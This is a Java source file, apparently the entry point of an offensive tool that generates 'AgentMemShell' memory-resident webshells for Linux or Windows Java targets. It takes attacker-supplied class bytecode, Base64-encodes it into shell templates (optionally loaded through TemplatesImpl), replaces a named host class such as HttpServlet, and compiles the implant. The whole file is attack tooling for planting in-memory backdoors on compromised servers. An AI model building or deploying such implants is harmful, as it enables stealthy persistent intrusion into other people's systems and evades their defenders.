package whocansee.AgentMemshell;

import org.apache.commons.cli.*;

import javax.tools.JavaCompiler;
import javax.tools.ToolProvider;
import java.io.IOException;
import java.io.PrintStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.Base64;
import java.util.Objects;

import static java.lang.System.out;

public class main0 {
    public static final String ANSI_RESET = "\u001B[0m";
    public static final String ANSI_BLACK = "\u001B[30m";
    public static final String ANSI_RED = "\u001B[31m";
    public static final String ANSI_GREEN = "\u001B[32m";
    public static final String ANSI_YELLOW = "\u001B[33m";
    public static final String ANSI_BLUE = "\u001B[34m";
    public static final String ANSI_PURPLE = "\u001B[35m";
    public static final String ANSI_CYAN = "\u001B[36m";
    public static final String ANSI_WHITE = "\u001B[37m";
    public static String classname;
    public static String path;

    public static String os;

    public static void main(String[] args) throws Exception {
        System.setOut(new PrintStream(System.out, true, "UTF-8"));
        PrintStream out = new PrintStream(System.out, true, StandardCharsets.UTF_8.name());
        Options options = new Options();
        Option osOption = Option.builder("o")
                .longOpt("os")
                .desc(ANSI_RED+"Target Linux/Windows（目标操作系统）"+ANSI_RESET+"\n——————————————————————————————————————————————")
                .required(true)
                .hasArg(true)
                .build();

        Option jdkOption = Option.builder("i")
                .longOpt("ifbeyondjdk8")
                .desc(ANSI_CYAN+"true/false;  If Target's JDKVersion > 8;only Windows requires（目标JDK版本是否大于8，仅目标为Windows时需要填写）"+ANSI_RESET+"\n——————————————————————————————————————————————")
                .hasArg(true)
                .build();

        Option pathOption = Option.builder("p")
                .longOpt("path")
                .desc(ANSI_BLUE+"Path to the new classByte,eg:/path/test.class (新类字节码的路径)"+ANSI_RESET+"\n——————————————————————————————————————————————")
                .hasArg(true)
                .required(true)
                .build();

        Option templatesimplOption = Option.builder("t")
                .longOpt("templatesimpl")
                .desc(ANSI_GREEN+"true/false;  Whether or not using templatesImpl to load classByte." +
                        "（是否使用templatesImpl完成   类字节码加载"+ANSI_RESET+ANSI_RESET+"\n——————————————————————————————————————————————")
                .hasArg(true)
                .required(true)
                .build();

        Option classnameOption = Option.builder("c")
                .longOpt("classname")
                .desc(ANSI_YELLOW+"Classname of the class to be replaced（宿主类的全限定类名）"+ANSI_RESET+"\n——————————————————————————————————————————————")
                .hasArg(true)
                .required(true)
                .build();

        Option osbitOption = Option.builder("b")
                .longOpt("bit")
                .desc(ANSI_PURPLE+"32/64; Plz input target's os-bit; " +
                        "Only Windows target available." +
                        "(目标操作系统位数，仅对于Windows目标可指定)"+ANSI_RESET+"\n——————————————————————————————————————————————")
                .hasArg(true)
                .build();

        options.addOption(classnameOption);
        options.addOption(pathOption);
        options.addOption(templatesimplOption);
        options.addOption(osOption);
        options.addOption(jdkOption);
        options.addOption(osbitOption);

        try {
            CommandLineParser parser = new DefaultParser();
            CommandLine cmd = parser.parse(options, args);

            String pointLength = "8";
            boolean ifBeyondJDK8 = true;
            String osbit = "64";

            os = cmd.getOptionValue("o");
            path = cmd.getOptionValue("p");
            boolean templateImpl = Boolean.parseBoolean(cmd.getOptionValue("t"));
            classname = cmd.getOptionValue("c");

            if (Objects.equals(os, "Windows")) {
                ifBeyondJDK8 = Boolean.parseBoolean(cmd.getOptionValue("i"));
                out.println(ANSI_CYAN+"ifBeyondJDK8: " + ifBeyondJDK8+ANSI_RESET);

                osbit = cmd.getOptionValue("b");
                if (Objects.equals(osbit, "32"))
                {pointLength = "4";}
                out.println(ANSI_PURPLE+"osbit: " + osbit+ANSI_RESET);
            }
            out.println(ANSI_RED+"os: " + os+ANSI_RESET);
            out.println(ANSI_BLUE+"ClassFilepath: " + path+ANSI_RESET);
            out.println(ANSI_YELLOW+"classname: " + classname+ANSI_RESET);
            out.println(ANSI_GREEN+"ifUseTemplatesImpl: " + templateImpl+ANSI_RESET);

            String AgentMemSrc = "";
            if (Objects.equals(os, "Linux") || Objects.equals(os, "linux")) {
                if (templateImpl) {
                    AgentMemSrc = new String(Files.readAllBytes(Paths.get("MemShellSrc\\LinuxAgentMemShellWithTpl")), StandardCharsets.UTF_8).replace("{{var1}}", classname).replace("{{var2}}", Base64.getEncoder().encodeToString(Files.readAllBytes(Paths.get(path))));}
                else {
                    AgentMemSrc = new String(Files.readAllBytes(Paths.get("MemShellSrc\\LinuxAgentMemShell")), StandardCharsets.UTF_8).replace("{{var1}}", classname).replace("{{var2}}", Base64.getEncoder().encodeToString(Files.readAllBytes(Paths.get(path))));}
            }
            else if (Objects.equals(os, "Windows") || Objects.equals(os, "windows")) {
                if (templateImpl) {
                    if (ifBeyondJDK8) {
                        AgentMemSrc = new String(Files.readAllBytes(Paths.get("MemShellSrc\\WindowsAgentMemShellBeyondJDK8WithTpl")), StandardCharsets.UTF_8).replace("{{var3}}", pointLength).replace("{{var1}}", classname).replace("{{var2}}", Base64.getEncoder().encodeToString(Files.readAllBytes(Paths.get(path))));}
                    else{
                        AgentMemSrc = new String(Files.readAllBytes(Paths.get("MemShellSrc\\WindowsAgentMemShellWithTpl")), StandardCharsets.UTF_8).replace("{{var3}}", pointLength).replace("{{var1}}", classname).replace("{{var2}}", Base64.getEncoder().encodeToString(Files.readAllBytes(Paths.get(path))));}
                }
                else if(ifBeyondJDK8) {
                    AgentMemSrc = new String(Files.readAllBytes(Paths.get("MemShellSrc\\WindowsAgentMemShellBeyondJDK8")), StandardCharsets.UTF_8).replace("{{var3}}", pointLength).replace("{{var1}}", classname).replace("{{var2}}", Base64.getEncoder().encodeToString(Files.readAllBytes(Paths.get(path))));}

                else {
                    AgentMemSrc = new String(Files.readAllBytes(Paths.get("MemShellSrc\\WindowsAgentMemShell")), StandardCharsets.UTF_8).replace("{{var3}}", pointLength).replace("{{var1}}", classname).replace("{{var2}}", Base64.getEncoder().encodeToString(Files.readAllBytes(Paths.get(path))));}
            }
            else {
                out.println("os error! Please input Linux or Windows");
                return;}
            String modifiedSourceFileName = "AgentMemShell.java";
            saveSourceFile(modifiedSourceFileName, AgentMemSrc);
            compileJavaFile(modifiedSourceFileName);}

        catch (MissingOptionException e){
            HelpFormatter formatter = new HelpFormatter();
            System.out.println("如果遇到了乱码，请尝试使用chcp 936更改当前字符编码后再运行程序");
            System.out.println("建议使用JDK8较低版本运行此程序，以生成兼容性更好的类字节码");
            System.out.println("classname 类名必须是全限定名,如javax.servlet.http.HttpServlet");
            formatter.printHelp("Missing Options！You must use -o -c -p -t at least. ", options);
        }
    }

    private static void saveSourceFile(String sourceFileName, String sourceCode) {
        try {
            Files.write(Paths.get(sourceFileName), sourceCode.getBytes(), StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    private static void compileJavaFile(String sourceFileName) {
        JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
        if (compiler == null) {
            out.println(ANSI_RED+"Java Compiler not found. Make sure you are using a JDK."+ANSI_RESET);
            return;
        }
        int compilationResult = compiler.run(null, null, null, "-d","out",sourceFileName);
        if (compilationResult == 0) {
            out.println(ANSI_GREEN+"Compilation successful. AgentMemShell Class file generated:"+"out/"+"AgentMemShell.class"+ANSI_RESET);
        } else {
            out.println(ANSI_RED+"Compilation failed."+ANSI_RESET);
        }
    }

}
